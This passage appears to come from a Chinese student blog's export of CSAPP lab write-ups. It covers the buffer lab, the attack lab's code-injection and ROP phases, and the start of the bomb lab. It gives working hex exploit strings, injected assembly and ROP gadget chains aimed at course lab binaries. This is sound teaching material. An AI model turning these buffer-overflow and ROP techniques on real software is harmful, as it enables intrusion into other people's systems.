\u0026hellip; ret push $0x08048c9d 0x08048c9d为bang函数的起始地址 movl $0x2bce0786,0x804d100 0x804d100为global_value变量的内存地址，0x2bce0786为hack对应的cookie值,当前地址为buf数组的初始地址 rsp-40字节 结合以上信息，构造下列答案：\n1 2 3 4 5 6 c7 05 00 d1 04 08 86 07 ce 2b 68 9d 8c 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 3e 68 55 运行结果如下：\nlevel3： Dynamite 目标：注入一段能够修改 getbuf 返回值的代码，返回值从 1 改成 cookie 值，此外还需要还原所有破坏，继续运行 test 的剩下部分，注意getbuf函数开头的push %ebp。\n同样回到 getbuff 的汇编代码：\n1 2 3 4 5 6 7 8 9 10 080491f4 \u0026lt;getbuf\u0026gt;: 80491f4:\t55 push %ebp 80491f5:\t89 e5 mov %esp,%ebp 80491f7:\t83 ec 38 sub $0x38,%esp 80491fa:\t8d 45 d8 lea -0x28(%ebp),%eax 80491fd:\t89 04 24 mov %eax,(%esp) 8049200:\te8 f5 fa ff ff call 8048cfa \u0026lt;Gets\u0026gt; 8049205:\tb8 01 00 00 00 mov $0x1,%eax 804920a:\tc9 leave 804920b:\tc3 ret 注意到调用Gets函数后，会将eax寄存器置1，于是我们需要跳过这条命令，再修改eax寄存器的值，最后返回到调用getbuf函数的下一条命令，不能回到getbuf函数的leave命令，因为返回test函数的地址已经没了，如果返回到getbuf函数的leave命令，那么还需在ret后面添加test函数的返回地址。\n结合 test 的前几行代码：\n1 2 3 4 5 6 7 8 9 10 08048daa \u0026lt;test\u0026gt;: 8048daa:\t55 push %ebp 8048dab:\t89 e5 mov %esp,%ebp 8048dad:\t53 push %ebx 8048dae:\t83 ec 24 sub $0x24,%esp 8048db1:\te8 da ff ff ff call 8048d90 \u0026lt;uniqueval\u0026gt; 8048db6:\t89 45 f4 mov %eax,-0xc(%ebp) 8048db9:\te8 36 04 00 00 call 80491f4 \u0026lt;getbuf\u0026gt; 8048dbe:\t89 c3 mov %eax,%ebx 8048dc0:\te8 cb ff ff ff call 8048d90 \u0026lt;uniqueval\u0026gt; 所以应当构造 Gets 的栈帧如下：\n地址 解释 返回地址 设置成缓冲区的首地址 ebp 占用4字节 \u0026hellip; \u0026hellip; ebp - 40 字节 buf 数组的初始地址，从这里开始注入修改 eax 的代码 \u0026hellip; \u0026hellip; ebp - 0x38 esp，栈帧首地址 构造的汇编命令如下：\n1 2 3 4 00000000 \u0026lt;.text\u0026gt;: 0:\tb8 86 07 ce 2b mov $0x2bce0786,%eax 5:\t68 0a 92 04 08 push $0x804920a a:\tc3 ret 为了防止对栈的破坏，ebp 是被调用者保存寄存器，是 test 在调用 getbuf 之后，getbuf 首先就就压进了栈帧里。同时为了使程序继续运行，需要保证 ebp 不被破坏。使用 gdb，在 getbuf 的第一行 0x080491f4 处打下断点，研究此时ebp 的值，ebp的值为0x55683ed0。\n所以构造的答案为：\n1 2 3 4 5 6 b8 86 07 ce 2b 68 be 8d 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0 3e 68 55 78 3e 68 55 最后的运行结果为：\nlevel4：Nitroglycerin（这个实验的解题思路有点没有理解） 目标：使用-n参数进入该实验，该实验会连续调用5次getbufn，要求我们每次在调用getbufn函数后返回cookie值，而不是1，同时还需恢复所有破坏。\n和前面不同的是，这一个阶段由于使用的是 getbufn 和 testn 函数，并且需要将一个相同的字符串输入五次。所以需要使用命令-n\n同时，文档也指出在 getbufn 中有#define KABOOM_BUFFER_SIZE 512，所以缓冲区大小为 512.\n这次研究 getbufn 的汇编代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 (gdb) disas Dump of assembler code for function getbufn: 0x0804920c \u0026lt;+0\u0026gt;:\tpush %ebp 0x0804920d \u0026lt;+1\u0026gt;:\tmov %esp,%ebp # esp 减去了 536 个字节 0x0804920f \u0026lt;+3\u0026gt;:\tsub $0x218,%esp # buf 的首地址空间离 ebp 有 520 个字节 =\u0026gt; 0x08049215 \u0026lt;+9\u0026gt;:\tlea -0x208(%ebp),%eax 0x0804921b \u0026lt;+15\u0026gt;:\tmov %eax,(%esp) 0x0804921e \u0026lt;+18\u0026gt;:\tcall 0x8048cfa \u0026lt;Gets\u0026gt; 0x08049223 \u0026lt;+23\u0026gt;:\tmov $0x1,%eax 0x08049228 \u0026lt;+28\u0026gt;:\tleave 0x08049229 \u0026lt;+29\u0026gt;:\tret End of assembler dump. 在这一阶段，getbufn 会调用 5 次，每次的储存的 ebp 都不一样，官方文档表示这个差值会在 +- 240 的样子：\n接下来使用 gdb，在 getbufn 打下断点，连续 5 次查看 % ebp 的值，可以得到这五次 ebp 的值分别是在：\nNo p/x $ebp p/x $ebp - 0x208 1 0x55683110 0x55682f08 2 0x556830b0 0x55682ea8 3 0x55683100 0x55682ef8 4 0x55683110 0x55682f08 5 0x55683180 0x55682f78 对应的，buf 的起始地址就是每一次记的 ebp 减去 208，也就是 520 字节。\n所以每一次的地址是无法确认的。英文文档中介绍了可以使用 nop sled 的方法来解决这一问题。参考 CSAPP 教材中的介绍：\n因为在这个实验中，栈的地址是变化的。我们不知道有效机器代码的入口地址了，因此我们需要在有效机器代码前填充大量的nop指令，只要程序可以跳转到这些nop指令中，那么最终就可以滑到有效的机器代码。\n运行getbufn函数时，会随机在栈上分配一块存储地址，因此，getbufn的基址ebp时随机变化的。但是又要求我们写的跳转地址是固定的，所以我们应该在有效代码之前大量填充nop指令，让这段地址内的代码都会滑到这段nop之后的代码上。\n由于栈上的机器代码是按地址由低向高顺序执行，要保证五次运行都能顺利执行有效机器代码，需要满足：跳转地址位于有效机器代码入口地址之前的nop机器指令填充区。这要求尽可能增大nop填充区，尽可能使有效机器代码段往后挪。\n从反汇编可以看出，buf的首地址为ebp-0x208，所以buf总共的大小为520字节。考虑这个函数中，testn的ebp随每次输入都随机变化，但是栈顶esp的位置却不变，所以我们可以通过esp和ebp的关系来找出这个关系，从而进行攻击\n首先在sub $0x218，esp这一句设置断点，并使用-n模式运行程序，并查看ebp的值。\n我们要做的是找出最大的ebp值0x556835e0，再减去0x208，即为最高的buf的始地址为：0x556833D8。\n如果将有效机器代码置于跳转地址之前，并将其它所有字符都用作nop指令，此时所有五个buf地址的写入都能满足跳转到地址0x556833D8后顺利到达有效机器代码\n接下来需要处理的问题是注入并覆盖 ebp 后，把正确的 esp 还原回去。研究 testn 的部分汇编代码：\n1 2 3 4 5 6 7 8 9 10 Dump of assembler code for function testn: 0x08048e26 \u0026lt;+0\u0026gt;:\tpush %ebp 0x08048e27 \u0026lt;+1\u0026gt;:\tmov %esp,%ebp 0x08048e29 \u0026lt;+3\u0026gt;:\tpush %ebx 0x08048e2a \u0026lt;+4\u0026gt;:\tsub $0x24,%esp 0x08048e2d \u0026lt;+7\u0026gt;:\tcall 0x8048d90 \u0026lt;uniqueval\u0026gt; 0x08048e32 \u0026lt;+12\u0026gt;:\tmov %eax,-0xc(%ebp) 0x08048e35 \u0026lt;+15\u0026gt;:\tcall 0x804920c \u0026lt;getbufn\u0026gt; 0x08048e3a \u0026lt;+20\u0026gt;:\tmov %eax,%ebx 0x08048e3c \u0026lt;+22\u0026gt;:\tcall 0x8048d90 \u0026lt;uniqueval\u0026gt; 在每一次调用了 getbufn 之后，ebp 的值将会被 push 进去。这个 ebp 值是等于 testn 被调用的时候 esp 存储的值的。esp 先由于 push ebx 而减去了 4，再手动减去了 0x24，所以这个时候 exp + 0x28 的值就是传入了 getbufn 开始的时候 ebp 的值。\n所以构造出来的汇编代码如下：\n1 2 3 4 lea 0x28(%esp), %ebp mov $0x362d5a70, %eax push $0x08048e3a ret 地址 解释 返回地址 设置成缓冲区的首地址 ebp 占用4字节 \u0026hellip; \u0026hellip; ebp - 520字节 buf 数组的初始地址，从这里开始注入修改 eax 的代码 \u0026hellip; \u0026hellip; ebp - 0x218 esp，栈帧首地址 ","date":"2024-10-06T00:00:00Z","image":"https://chenyuan1125.github.io/p/csappbuffer%E5%AE%9E%E9%AA%8C/1_hu5285632878379324052.jpg","permalink":"https://chenyuan1125.github.io/p/csappbuffer%E5%AE%9E%E9%AA%8C/","title":"CSAPP:buffer实验"},{"content":"Attack lab 该实验在我电脑的wsl的ubuntu操作系统下无法正常运行，在debian环境下能正常运行，注意运行时要加上-q\nPart I:Code Injection Attacks Level 1 通过输入字符串，利用栈溢出原理，将getbuf函数的返回地址改成touch1函数的入口地址\n注意字节顺序\ngetbuf函数的反汇编代码\n1 2 3 4 5 6 7 8 9 00000000004017a8 \u0026lt;getbuf\u0026gt;: 4017a8:\t48 83 ec 28 sub $0x28,%rsp 4017ac:\t48 89 e7 mov %rsp,%rdi 4017af:\te8 8c 02 00 00 call 401a40 \u0026lt;Gets\u0026gt; 4017b4:\tb8 01 00 00 00 mov $0x1,%eax 4017b9:\t48 83 c4 28 add $0x28,%rsp 4017bd:\tc3 ret 4017be:\t90 nop 4017bf:\t90 nop phase_1.txt文件\n1 2 3 4 5 6 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 运行命令\n1 ./hex2raw \u0026lt; phase_1.txt |./ctarget -q Level 2 level2需要将vlevel的值改成cookie值，再return到touch2函数入口处。\n修改后的rsp寄存器如下所示：\nphase_2.txt文件\n1 2 3 4 5 6 48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 运行命令\n1 ./hex2raw \u0026lt; phase_1.txt |./ctarget -q 结果\n1 2 3 4 5 6 7 8 Cookie: 0x59b997fa Type string:Touch2!: You called touch2(0x59b997fa) Valid solution for level 2 with target ctarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 Level3 本题与上题类似，不同点在于传的参数是一个字符串。先给出touch3的C语言代码\n1 2 3 4 5 6 7 8 9 10 11 12 void touch3(char *sval) { vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { printf(\u0026#34;Touch3!: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); validate(3); } else { printf(\u0026#34;Misfire: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); fail(3); } exit(0); } touch3中调用了hexmatch，它的C语言代码为：\n1 2 3 4 5 6 7 8 9 /* Compare string to hex represention of unsigned value */ int hexmatch(unsigned val, char *sval) { char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, \u0026#34;%.8x\u0026#34;, val); return strncmp(sval, s, 9) == 0; } 也就是说，要把cookie转换成对应的字符串传进去\n注意第6行，s的位置是随机的，我们写在getbuf栈中的字符串很有可能被覆盖，一旦被覆盖就无法正常比较。\n因此，考虑把cookie的字符串数据存在test的栈上，其它部分与上题相同，这里不再重复思路。\n注入代码 先查找test栈顶指针的位置：\n0x5561dca8，这就是字符串存放的位置，也是调用touch3应该传入的参数，又touch3代码的地址为4018fa。从而得到代码：\n1 2 3 movq $0x5561dca8, %rdi pushq $0x4018fa ret 字节级表示为：\n1 2 3 4 5 6 Disassembly of section .text: 0000000000000000 \u0026lt;.text\u0026gt;: 0: 48 c7 c7 a8 dc 61 55 mov $0x5561dca8,%rdi 7: 68 fa 18 40 00 pushq $0x4018fa c: c3 retq 栈帧讲解 我们期望的栈帧为\n逻辑如下：\ngetbuf执行ret，从栈中弹出返回地址，跳转到我们注入的代码 代码执行，先将存在caller的栈中的字符串传给参数寄存器%rdi，再将touch3的地址压入栈中 代码执行ret，从栈中弹出touch3指令，成功跳转 Solution cookie0x59b997fa作为字符串转换为ASCII为：35 39 62 39 39 37 66 61\n注入代码段的地址与上题一样，同样为0x5561dc78\n由于在test栈帧中多利用了一个字节存放cookie，所以本题要输入56个字节。注入代码的字节表示放在开头，33-40个字节放置注入代码的地址用来覆盖返回地址，最后八个字节存放cookie的ASCII 。于是得到如下输入：\n1 2 3 4 5 6 7 48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 攻击成功！\nPart II:Return-Oriented Programing 在第二部分中，我们要攻击的是rtarget，他的代码内容和第一部分一致，但采用了两种策略来阻止缓冲区溢出攻击\n栈随机化 这段程序分配的栈的位置正每次运行时都是随机的，这就使我们无法确定在哪里插入代码 限制可执行代码区域 也就是存放在栈上的代码不可执行，使得插入的恶意代码无法执行 针对这些防御措施，文档提供了攻击策略，即ROP：面向返回的程序设计，就是在已经存在的程序中找到特定的以ret结尾的指令序列为我们所用，称这样的代码段为gadget，把要用到部分的地址压入栈中，每次ret后又会取出一个新的gadget，于是这样就能形成一个程序链，实现我们的目的。我喜欢将这种攻击方式称作“就地取材，拼凑代码”。\n同时也给出指令编码表\n举个例子：\nrtarget有这样一个函数：\n1 2 3 4 void setval_210(unsigned *p) { *p = 3347663060U; } 它的汇编代码字节级表示为：\n1 2 3 0000000000400f15 \u0026lt;setval_210\u0026gt;: 400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi) 400f1b: c3 retq 查表可知，取其中一部分字节序列 48 89 c7 就表示指令movq %rax, %rdi，这整句指令的地址为0x400f15，于是从0x400f18开始的代码就可以变成下面这样：\n1 2 movq %rax, %rdi ret 这个小片段就可以作为一个gadget为我们所用。\n其它一些可以利用的代码都在文件farm.c中展示了出来\nlevel1 本题的任务和phase2相同，都是要求返回到touch2函数，phase2中用到的注入代码为\n1 2 3 movq $0x59b997fa, %rdi pushq $0x4017ec ret 由于我们无法找到这个特定值的gadget，所以我们可以先将我们需要的值写入栈中，再利用pop命令将其pop到rdi寄存器中，最后再返回touch2的函数起始地址，任务便完成。\n但是farm中找不到pop到rdi寄存器指令的gadget，所以我们另辟蹊径，先pop到rax中，再mov %rax，%rdi，即\n1 2 3 4 5 popq %rax ret ############# mov %rax,%rdi ret 逻辑如下：\ngetbuf执行ret，从栈中弹出返回地址，跳转到我们的gadget01 gadget01执行，将cookie弹出，赋值给%rax，然后执行ret，继续弹出返回地址，跳转到gadget2 gadget2执行，将cookie值成功赋值给参数寄存器%rdi，然后执行ret，继续弹出返回地址，跳转到touch2 Solution 首要问题是找到我们需要的gadget\n先用如下指令得到target的汇编代码及字节级表示\n1 objdump -d rtarget \u0026gt; rtarget.s 查表知，pop %rax用58表示，于是查找58\n1 2 3 00000000004019a7 \u0026lt;addval_219\u0026gt;: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 retq retq 得到指令地址为0x4019ab\nmovq %rax, %rdi表示为48 89 c7，刚好能找到！其中 90 表示“空”，可以忽略\n1 2 3 00000000004019c3 \u0026lt;setval_426\u0026gt;: 4019c3: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 4019c9: c3 retq 得到指令地址为0x4019c5\n根据上图的栈帧，就能写出输入序列：\n1 2 3 4 5 6 7 8 9 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 c5 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00 level2 来自官方的劝退哈哈哈，Before you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now. Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.\n这道题主要是在rtarget中返回到touch3，看似没有难度\nPhase 3中用到的注入代码为：\n1 2 3 movq $0x5561dca8, %rdi pushq $0x4018fa ret 其中0x5561dca8是栈中cookie存放的地址。\n在本题中由于栈随机化，不能直接将0x5561dca8地址直接给%rdi，可以利用%rsp的相对偏移量来获取cookie的存放地址，\n1 2 3 4 5 6 7 8 9 10 11 movq $0x30(%rsp), %rdi movq %rsp, %rax movq %rax, %rdi lea (%rdi,%rsi,1),%rax movq %rax, %rdi movl %eax, %edi movl %eax, %edx movl %esp, %eax movl %ecx, %esi pushq $0x4018fa ret 查表，movq %rsp, xxx表示为48 89 xx，查找一下有没有可用的gadget\n1 2 3 0000000000401aab \u0026lt;setval_350\u0026gt;: 401aab: c7 07 48 89 e0 90 movl $0x90e08948,(%rdi) 401ab1: c3 retq 还真找到了，48 89 e0对应的汇编代码为\n1 movq %rsp, %rax 地址为：0x401aad\n根据提示，有一个gadget一定要用上\n1 2 3 00000000004019d6 \u0026lt;add_xy\u0026gt;: 4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 4019da: c3 retq 地址为：0x4019d6\n通过合适的赋值，这段代码就能实现%rsp加上段内偏移地址来确定cookie的位置\n剩下部分流程与Phase 3一致，大体思路如下：\n先取得栈顶指针的位置 取出存在栈中得偏移量的值 通过lea (%rdi,%rsi,1),%rax得到 cookie 的地址 将 cookie 的地址传给%rdi 调用touch 3 由于gadget的限制，中间的细节需要很多尝试，尝试过程不再一一列举了，直接给出代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #地址：0x401aad movq %rsp, %rax ret #地址：0x4019a2 movq %rax, %rdi ret #地址：0x4019cc popq %rax ret #地址：0x4019dd movl %eax, %edx ret #地址：0x401a70 movl %edx, %ecx ret #地址：0x401a13 movl %ecx, %esi ret #地址：0x4019d6 lea (%rdi,%rsi,1),%rax ret #地址：0x4019a2 movq %rax, %rdi ret 注意movl %ecx, %esi这条指令对应89 d1，截取下面部分\n1 2 3 0000000000401a6e \u0026lt;setval_167\u0026gt;: 401a6e:\tc7 07 89 d1 91 c3 movl $0xc391d189,(%rdi) 401a74:\tc3 按理说后面是91不是90(nop)，所以不能取，但在x86汇编中，0x91 表示 xchg eax, ecx 指令。这条指令的作用是交换 %eax 和 %ecx 寄存器的值。不影响寄存器的值，所以可以。\n栈帧讲解 为节省空间，每一行代码都省略了后面的ret，\n逻辑在图上标的很清楚，这里就不再用文字写啦！\n要注意，getbuf执行ret后相当于进行了一次pop操作，test的栈顶指针%rsp=%rsp+0x8，所以cookie相对于此时栈顶指针的偏移量是0x48而不是0x50\nSolution 根据上图的栈帧，写出输入序列：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ad 1a 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 cc 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 70 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 ","date":"2024-09-29T00:00:00Z","image":"https://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/R_hu8573152181181443583.jpg","permalink":"https://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/","title":"CSAPP:attack实验"},{"content":"Bomb实验 题目解析 注意：本人所写的注释可能有些错误，有问题还请大家批评指正，注释中*的用法和C语言类似，有些寄存器名称没有带%\n题目只给了一个main函数，我们可以大致看出来，它的模式是从某个地方读取字符串，然后作为参数输入每个关卡phase_，进行验证。具体的情况没有显示，说明我们需要通过某种手段去进行探查：\n1 objdump -d bomb \u0026gt; bomb.s 同时看到bomb.c中：\n1 2 3 4 5 /* When run with no arguments, the bomb reads its input lines * from standard input. */ if (argc == 1) { infile = stdin; } 说明可以通过文件读取的方式进行读取。\n寄存器说明：\nPhase_1 关键代码\n1 2 3 4 5 6 7 8 9 0000000000400ee0 \u0026lt;phase_1\u0026gt;: 400ee0:\t48 83 ec 08 sub $0x8,%rsp //将栈指针减少8，也就是入栈 400ee4:\tbe 00 24 40 00 mov $0x402400,%esi 400ee9:\te8 4a 04 00 00 call 401338 \u0026lt;strings_not_equal\u0026gt; /*test指令同逻辑与and运算，但只设置条件码寄存器，不改变目的寄存器的值，test %eax,%eax用于测试寄存器%eax是否为空，由于寄存器%rax一般存放函数的返回值，此处应该存放的是函数 strings_not_equal的值，而%eax是%rax的低32位表示，所以不难分析出，当%eax值为0时，test的两个操作数相同且都为0，条件码ZF置位为1，即可满足下一行代码的跳转指令*/ 400eee:\t85 c0 test %eax,%eax 400ef0:\t74 05 je 400ef7 \u0026lt;phase_1+0x17\u0026gt; //当ZF位为0时，跳转到400ef7处 400ef2:\te8 43 05 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //调用explode-bomb函数，爆炸 400ef7:\t48 83 c4 08 add $0x8,%rsp //出栈 400efb:\tc3 ret 仅从函数调用的角度来看，phase_1的参数存在1st argument寄存器中：%rdi，然后这个参数作为第一个参数，与0x402400作为第二个参数一起被传入到strings_not_equal中，进行一些判定操作。\n0x402400像一个地址，使用gdb对程序进行debug，设置断点查看0x402400的值，发现是Border relations with Canada have never been better.，答案已找到\nPhase_2 关键代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 0000000000400efc \u0026lt;phase_2\u0026gt;: 400efc:\t55 push %rbp 400efd:\t53 push %rbx 400efe:\t48 83 ec 28 sub $0x28,%rsp //入栈，栈指针减少40 400f02:\t48 89 e6 mov %rsp,%rsi //将%rsp赋给%rsi(第二个参数寄存器) 400f05:\te8 52 05 00 00 call 40145c \u0026lt;read_six_numbers\u0026gt; 400f0a:\t83 3c 24 01 cmpl $0x1,(%rsp) //将(%rsp)与1比较 400f0e:\t74 20 je 400f30 \u0026lt;phase_2+0x34\u0026gt; //若相等，则跳转到0x400f30 400f10:\te8 25 05 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //若不相等，则爆炸 400f15:\teb 19 jmp 400f30 \u0026lt;phase_2+0x34\u0026gt; 400f17:\t8b 43 fc mov -0x4(%rbx),%eax //(%rbx-4)取值后赋给eax寄存器 400f1a:\t01 c0 add %eax,%eax //eax=eax+eax 400f1c:\t39 03 cmp %eax,(%rbx) //比较%eax和(%rbx)的值 400f1e:\t74 05 je 400f25 \u0026lt;phase_2+0x29\u0026gt; //如果相等，跳转到0x400f25 400f20:\te8 15 05 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //如果不相等，就爆炸 400f25:\t48 83 c3 04 add $0x4,%rbx //rbx寄存器+4 400f29:\t48 39 eb cmp %rbp,%rbx //%rbx与%rbp比较 400f2c:\t75 e9 jne 400f17 \u0026lt;phase_2+0x1b\u0026gt; //如果不相等，跳转到0x400f17 400f2e:\teb 0c jmp 400f3c \u0026lt;phase_2+0x40\u0026gt; //跳转到400f3c 400f30:\t48 8d 5c 24 04 lea 0x4(%rsp),%rbx //(%rsp+4)后赋值给%rbx 400f35:\t48 8d 6c 24 18 lea 0x18(%rsp),%rbp //(%rsp+18)后再赋值给%rbp 400f3a:\teb db jmp 400f17 \u0026lt;phase_2+0x1b\u0026gt; //跳转到0x40f17 400f3c:\t48 83 c4 28 add $0x28,%rsp //出栈，栈指针增加40 400f40:\t5b pop %rbx 400f41:\t5d pop %rbp 400f42:\tc3 ret 可以看出这个阶段读取六个数字，并通过一个循环将其与对应的值对比，这些对应值的规律就是1 2 4 8 16 32，答案已出。\n（lea 0x18(%rsp),%rbp指令是将%rsp+40传给%rbp，lea指令用于计算有效地址，以及加法和有限的乘法运算，而其余如mov -0x4(%rbx),%eax则是取(%rbx-4)的值再传给%eax）\nPhase_3 关键代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 0000000000400f43 \u0026lt;phase_3\u0026gt;: 400f43:\t48 83 ec 18 sub $0x18,%rsp //入栈，栈指针减少24 400f47:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx //%rsp+12赋给%rcx 400f4c:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx //%rsp+8赋给%rdx 400f51:\tbe cf 25 40 00 mov $0x4025cf,%esi //将0x4025cf赋给%esi 第二个参数寄存器 400f56:\tb8 00 00 00 00 mov $0x0,%eax //将0x0赋给%eax 400f5b:\te8 90 fc ff ff call 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; //调用scanf输入函数 400f60:\t83 f8 01 cmp $0x1,%eax //比较返回值和0x1的大小,sscanf的返回值是成功解析和存储的参数数目。 400f63:\t7f 05 jg 400f6a \u0026lt;phase_3+0x27\u0026gt; //如果大于则跳转到0x400f6a 400f65:\te8 d0 04 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 400f6a:\t83 7c 24 08 07 cmpl $0x7,0x8(%rsp) //比较0x7和(%rsp+8)值的大小 400f6f:\t77 3c ja 400fad \u0026lt;phase_3+0x6a\u0026gt; //如果 (%rsp+8)\u0026gt;7 跳转到0x400fad即爆炸 400f71:\t8b 44 24 08 mov 0x8(%rsp),%eax //当(%rsp+8)\u0026lt;=7时，将(%rsp+8)的值放入%eax中 400f75:\tff 24 c5 70 24 40 00 jmp *0x402470(,%rax,8) //跳转到存放在%rax*8+0x402470内存位置上的指令，即%eax*8+0x402470 400f7c:\tb8 cf 00 00 00 mov $0xcf,%eax //将0xcf赋给%eax 400f81:\teb 3b jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; //跳转到0x400fbe 400f83:\tb8 c3 02 00 00 mov $0x2c3,%eax 400f88:\teb 34 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f8a:\tb8 00 01 00 00 mov $0x100,%eax 400f8f:\teb 2d jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f91:\tb8 85 01 00 00 mov $0x185,%eax 400f96:\teb 26 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f98:\tb8 ce 00 00 00 mov $0xce,%eax 400f9d:\teb 1f jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f9f:\tb8 aa 02 00 00 mov $0x2aa,%eax 400fa4:\teb 18 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fa6:\tb8 47 01 00 00 mov $0x147,%eax 400fab:\teb 11 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fad:\te8 88 04 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; 400fb2:\tb8 00 00 00 00 mov $0x0,%eax 400fb7:\teb 05 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fb9:\tb8 37 01 00 00 mov $0x137,%eax 400fbe:\t3b 44 24 0c cmp 0xc(%rsp),%eax //比较(%rsp+12)和%eax的值 400fc2:\t74 05 je 400fc9 \u0026lt;phase_3+0x86\u0026gt; //如果相等，则跳转到0x400fc9 400fc4:\te8 71 04 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //如果不相等，就爆炸 400fc9:\t48 83 c4 18 add $0x18,%rsp //出栈，栈指针增加24 400fcd:\tc3 ret 注意：jg指令是后面的操作数大于前面的操作数，不要弄反了\n首先根据sscanf函数确定有两个参数，刚好%rsp+8和%rsp+12没有赋值，于是推测这两个值对应这两个变量，接着由于sscanf函数返回参数的数目，所以必须输入两个数，并且第一个参数要小于等于7，最后根据下面这条关键指令判断第二个参数取决于第一个参数的值，使用gdb遍历打印相应的跳转地址的值，得到以下列表。\n最关键的指令是：\n400f75:\tff 24 c5 70 24 40 00 jmp *0x402470(,%rax,8)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 (gdb) x/ *0x402470 第一个参数为0，第二个参数为0xcf 0x400f7c \u0026lt;phase_3+57\u0026gt;: \u0026#34;\\270\u0026#34; (gdb) x/s *0x402478 第一个参数为1，第二个参数为0x137 311 0x400fb9 \u0026lt;phase_3+118\u0026gt;: \u0026#34;\\270\\067\\001\u0026#34; (gdb) x/ *0x402480 第一个参数为2，第二个参数为0x2c3 0x400f83 \u0026lt;phase_3+64\u0026gt;: \u0026#34;\\270\\303\\002\u0026#34; (gdb) x/ *0x402488 第一个参数为3，第二个参数为0x100 0x400f8a \u0026lt;phase_3+71\u0026gt;: \u0026#34;\\270\u0026#34; (gdb) x/ *0x402490 第一个参数为4，第二个参数为0x185 0x400f91 \u0026lt;phase_3+78\u0026gt;: \u0026#34;\\270\\205\\001\u0026#34; (gdb) x/ *0x402498 第一个参数为5，第二个参数为0xce 0x400f98 \u0026lt;phase_3+85\u0026gt;: \u0026#34;\\270\u0026#34; (gdb) x/ *0x4024a0 第一个参数为6，第二个参数为0x2aa 0x400f9f \u0026lt;phase_3+92\u0026gt;: \u0026#34;\\270\\252\\002\u0026#34; (gdb) x/ *0x4024a8 第一个参数为7，第二个参数为0x147 0x400fa6 